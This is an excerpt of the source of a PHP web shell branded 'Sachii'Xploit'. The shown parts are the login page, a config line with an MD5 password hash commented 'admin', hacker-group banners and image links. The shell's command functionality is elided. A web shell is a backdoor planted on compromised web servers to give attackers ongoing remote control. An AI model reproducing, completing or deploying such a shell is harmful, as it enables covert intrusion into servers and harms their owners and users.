...
/* Configurasi */
$auth_pass          = "8157bf2100042b1ced0dde7f505064ad";// admin
$color              = "#00ff00";
...
<html>
    <head>
        ...
        <title>SHELL ./Sachii'Xploit</title>
            ...
            <div class="container" style="margin-top: 3%">
                <div class="col-lg-6">
                    <div class="form-group">
                        <center>
                            <img src="https://thumbs.gfycat.com/EvilSpecificChanticleer-size_restricted.gif" width="400" height="200">
                        </center>
                        <h1 class="text-center">./Sachii'Xploit</h1>
                        <h5 class="text-center pb-5"><cite><font color="red">root@<font color="white">sachiihaxor</font></cite></h5>
                        <form method="post">
                            <input type="password" name="pass" placeholder="ID SHELL" class="form-control"><br/>
...
<html>
    <head>
        ...
        <link rel="icon" type="image/png" href="https://www.indsc.me/images/logo.png"/>
        <title>./Sachii'Xploit SHELL</title>
...
<img src="https://c.tenor.com/2_KDGUcwgOwAAAAM/calvinbanks-armpit.gif" width="200">
            <br><a href="https://facebook.com/IndoSecOfficial" style="color:#ffffff;">./SachiiXploit</h1>
